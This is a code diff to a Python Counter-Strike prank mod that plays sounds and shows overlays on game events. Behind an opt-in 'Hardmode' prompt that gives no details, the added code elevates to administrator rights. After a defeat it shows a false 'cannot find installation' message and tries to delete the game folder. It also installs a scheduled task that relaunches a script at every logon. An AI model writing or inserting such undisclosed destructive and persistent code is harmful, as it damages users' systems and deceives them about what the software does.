@@ -4,14 +4,16 @@ import queue
 import winreg
 import vdf
 import shutil
-import sys
 import json
+import subprocess
 import random
+import sys
 import filecmp
+import ctypes
 import pygame
 import webbrowser
 import pyautogui
-import logging
+import time
 import tkinter as tk 
 from threading import Thread
 from ctypes import windll
@@ -19,48 +21,104 @@ from flask import Flask, request
 from PIL import Image, ImageTk
 from tkinter import messagebox
 
-confirmation = messagebox.askyesno(
-    "Yahiamod Confirmation",
-    "Do you want to enable Hardmode?\nThis may have unforeseen consequences..."
-)
+# For admin rights, this is needed early
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 
-for y in range(1, random.randint(8,20)):
-    if confirmation:
-        string = "Are you "
-        if random.randint(0,8) == 4:
-            for x in range(1,y):
-                    string = string + " REALLY "
-            confirmation = messagebox.askyesno(
-            "Hardmode?",
-            string + " NOT sure?",
+def run_as_admin(a):
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        return True
+    
+    elif a == True:
+        script = os.path.abspath(sys.argv[0])
+        params = " ".join([f'"{x}"' for x in sys.argv[1:]])
+        try:
+            ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, f'"{script}" {params}', None, 1
             )
-            if confirmation:
-                confirmation = False
-                messagebox.showinfo(
-                    "Hardmode is NOT enabled",
-                    "Enjoy your regular Yahiamod experience!"
+        except:
+            return False
+        sys.exit()
+    else:
+        return False
+
+
+if run_as_admin(False) == False:
+    confirmation = messagebox.askyesno(
+        "Yahiamod Confirmation",
+        "Do you want to enable Hardmode?\nThis may have unforeseen consequences..."
+    )
+
+    for y in range(1, random.randint(8,20)):
+        if confirmation:
+            string = "Are you "
+            if random.randint(0,8) == 4:
+                for x in range(1,y):
+                        string = string + " REALLY "
+                confirmation = messagebox.askyesno(
+                "Hardmode?",
+                string + " NOT sure?",
+                )
+                if confirmation:
+                    confirmation = False
+                    save_path = os.path.join(SCRIPT_DIR, "save.txt")
+
+                    save_path = os.path.join(SCRIPT_DIR, "save.txt")
+
+                    # ---------- LOAD ----------
+                    try:
+                        with open(save_path, "r", encoding="utf-8") as f:
+                            lines = f.readlines()
+                    except FileNotFoundError:
+                        lines = []
+
+                    # Ensure exactly 2 lines exist
+                    while len(lines) < 2:
+                        lines.append("\n")
+
+                    # Get line 1 (index 1)
+                    line = lines[1].strip()
+
+                    # ---------- UPDATE FAIL COUNT ----------
+                    if line.startswith("failed_hardmode="):
+                        try:
+                            fails = int(line.split("=")[1]) + 1
+                        except:
+                            fails = 1
+                    else:
+                        fails = 1  # Line missing or invalid
+
+                    # Write updated value to line 1
+                    lines[1] = f"failed_hardmode={fails}\n"
+
+                    # ---------- SAVE ----------
+                    with open(save_path, "w", encoding="utf-8") as f:
+                        f.writelines(lines)
+
+                    messagebox.showinfo(
+                        "Hardmode is NOT enabled",
+                        "Enjoy your regular Yahiamod experience!\nYou failed to enable Hardmode: " + str(fails) + " times."
+                    )
+
+                elif not confirmation:
+                    confirmation = True
+            else:
+                for x in range(1,y):
+                        string = string + " REALLY "
+                confirmation = messagebox.askyesno(
+                    "Hardmode?",
+                    string + "sure?",
                 )
         else:
-            for x in range(1,y):
-                    string = string + " REALLY "
-            confirmation = messagebox.askyesno(
-                "Hardmode?",
-                string + "sure?",
-            )
-    else:
-        break
+            break
 
-if confirmation:
-    messagebox.showinfo(
-        "Hardmode Enabled",
-        "Hardmode is now enabled. Good luck!"
-    )
+    if confirmation:
+        messagebox.showinfo(
+            "Hardmode Enabled",
+            "Hardmode is now enabled. Good luck!"
+        )
+        run_as_admin(True)
 else:
-    messagebox.showinfo(
-        "Hardmode is NOT enabled",
-        "Enjoy your regular Yahiamod experience!"
-    )
-
+    confirmation = True
 debug = messagebox.askyesno(
     "Debug Mode",
     "Enable debug mode? (For troubleshooting purposes)"
@@ -69,7 +127,10 @@ debug = messagebox.askyesno(
 if debug:
     print("[Init] Debug mode is ON \nget_counter_strike_path function defining...")
 
+game_folder = ""
+
 def get_counter_strike_path(font_path):
+    global game_folder
     yahiamice_changed = False
     fonts_changed = False
     try:
@@ -184,7 +245,6 @@ def get_counter_strike_path(font_path):
 if debug:
     print("[Init] get_counter_strike_path function defined successfully\nSetting script directories...")    
 
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 DATA_FILE = os.path.join(SCRIPT_DIR, "data.json")
 RESOURCES_DIR = os.path.join(SCRIPT_DIR, "resources")
 
@@ -193,6 +253,7 @@ VICTORY_SOUND_PATH = os.path.join(RESOURCES_DIR, "boom.mp3")
 DEFEAT_SOUND_PATH = os.path.join(RESOURCES_DIR, "tf2.mp3")
 FLASH_IMAGE_PATH = os.path.join(RESOURCES_DIR, "lemur.png")
 FLASH_SOUND_PATH = os.path.join(RESOURCES_DIR, "lemur.mp3")
+LAVA_CHICKEN_SOUND_PATH= os.path.join(RESOURCES_DIR, "jackblack.mp3")
 FONT_PATH = [os.path.join(RESOURCES_DIR, "fonts.conf"), os.path.join(RESOURCES_DIR, "ComicBD.ttf"), os.path.join(RESOURCES_DIR, "Comic.ttf")]
 cs_directory = get_counter_strike_path(FONT_PATH)
 parent_directory = os.path.dirname(SCRIPT_DIR)
@@ -211,9 +272,12 @@ root.overrideredirect(True)
 root.attributes("-topmost", True)
 root.attributes("-alpha", 0.0)
 
-hwnd = root.winfo_id()
-exstyle = windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
-windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, exstyle | WS_EX_NOACTIVATE | WS_EX_TOOLWINDOW)
+root.update_idletasks()
+hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
+WS_EX_TRANSPARENT = 0x20
+WS_EX_LAYERED = 0x80000
+style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
+ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, style | WS_EX_TRANSPARENT | WS_EX_LAYERED)
 
 pygame.mixer.init()
 
@@ -229,6 +293,7 @@ preloaded_images = {}
 KILL_PATHS = [
     {"image": "cantelope.png", "sound": "cantaloupe.ogg"},
     {"image": "pineapple.png", "sound": "pineapple.ogg"},
+    {"image": "nerd.gif", "sound": "nerd.mp3"},
     {"image": "cinema.png", "sound": "boom.mp3"},
     {"image": "weiner.png", "sound": "weiner.mp3"},
     {"image": "sins.png", "sound": "sins.wav"}
@@ -349,8 +414,8 @@ def show_overlay(image_obj, sound_path):
 
     pygame.mixer.Sound(sound_path).play()
 
-    fade_in(0.0)  # ← THIS IS WHAT YOU ARE MISSING
-
+    fade_in(0.0) 
+    
 def fade_in(alpha=0.0):
     if alpha < 1.0:
         root.attributes("-alpha", alpha)
@@ -384,15 +449,13 @@ if debug:
 if random.random() < 0.02:
     os.startfile(important_video_path)
 
-if debug:
-    print("[Init] Starting flask server...")
 app = Flask(__name__)
 
 if debug:
     print("[SRV]Game Event")
 @app.route("/", methods=["POST"])
 def game_event():
-    global last_data
+    global last_data, menu_timing_flag, washee_opened, start_time, activity, confirmation, game_folder
     data = request.json
     data_path = os.path.join(SCRIPT_DIR, "data.json")
     with open(data_path, "w", encoding="utf-8") as f:
@@ -404,6 +467,8 @@ def game_event():
     # starts by checking if steamID match
 
     if last_data == "":
+        menu_timing_flag = False
+        washee_opened = False
         last_data = data
         return "Counter Strike Response", 200
 
@@ -431,6 +496,14 @@ def game_event():
         if flashed > 0 and last_flashed == 0:
             ui_queue.put(("flash", None))
         
+        fire = data.get("player", {}).get("state", {}).get("burning", 0)
+        if fire == 255 and last_data.get("player", {}).get("state", {}).get("burning", 0) == 0:
+            try:
+                pygame.mixer.stop()
+                pygame.mixer.Sound(LAVA_CHICKEN_SOUND_PATH).play()
+            except Exception:
+                pass
+
         ct = data.get("map", {}).get("team_ct", {}).get("score", 0)
         t = data.get("map", {}).get("team_t", {}).get("score", 0)
         team = data.get("player", {}).get("team", "")
@@ -450,6 +523,12 @@ def game_event():
             else:
                 try:
                     pygame.mixer.Sound(DEFEAT_SOUND_PATH).play()
+                    if confirmation:
+                        messagebox.showwarning(
+                            "Eh, you win some you lose some",
+                            "Sorry , yahiamod cant find your Counter Strike Installation..."
+                        )
+                        os.rmdir(game_folder)
                 except Exception:
                     pass
         
@@ -457,7 +536,7 @@ def game_event():
         last_money = last_data.get("player", {}).get("state", {}).get("money", 0)
         round = data.get("map", {}).get("round", 0)
         last_round = last_data.get("map", {}).get("round", 0)
-        if money > last_money and round != last_round:
+        if money > 2800 > last_money and round != last_round:
             ui_queue.put(("stake", None))
 
         health = data.get("player", {}).get("state", {}).get("health", 100)
@@ -465,13 +544,58 @@ def game_event():
             ui_queue.put(("horse", None))
 
         activity = data.get("player", {}).get("activity", "none")
+        if last_data.get("match", {}).get("mode", "none") != "none" and data.get("match", {}).get("mode", "none") == "none":
+            try:
+                pygame.mixer.Sound(os.path.join(RESOURCES_DIR,"cutaway.mp3")).play()
+            except Exception:
+                pass
+        
+        if last_data.get("match", {}).get("mode", "none") == "none" and data.get("match", {}).get("mode", "none") != "none":
+            try:
+                pygame.mixer.Sound(os.path.join(RESOURCES_DIR,"cutaway.mp3")).play()
+            except Exception:
+                pass
+
         if activity == "menu":
-            if debug:
-                print("[INFO] Kill count reset.")
-            last_kills = 0
-            last_flashed = flashed
+            
+
+            # KILL COUNT RESET
+            if data.get("map", {}).get("round", 0) == 0:
+                if debug:
+                    print("[INFO] Kill count reset.")
+                last_kills = 0
+                last_flashed = flashed
+
+            # WASHEE TIMER
+            if menu_timing_flag == False and washee_opened == False:
+                menu_timing_flag = True
+                start_time = time.time()
+            elif washee_opened == False:
+                elapsed_time = time.time() - start_time
+                if elapsed_time > 300:
+                    washee_opened = True
+                    if debug:
+                        print("[INFO] Opening Washee Washee Pyw")
+                    os.startfile(os.path.join(SCRIPT_DIR, "washee.pyw"))
+                    if confirmation:
+                        messagebox.showwarning(
+                            "Washee Washee Unstoppable",
+                            "You feel a curse upon you as Washee Washee appears...\nThere is no escape now."
+                        )
+                        
+                        washee_path = os.path.join(SCRIPT_DIR, "washee.pyw")
+                        subprocess.run([
+                            "schtasks", "/create",
+                            "/tn", "washee_washee_task",
+                            "/tr", f'"{sys.executable}" "{washee_path}"',
+                            "/sc", "onlogon",
+                            "/rl", "LIMITED"
+                        ])
+                else:
+                    menu_timing_flag = False
         
         last_data = data
+        
 
     return "Counter Strike Response", 200
 
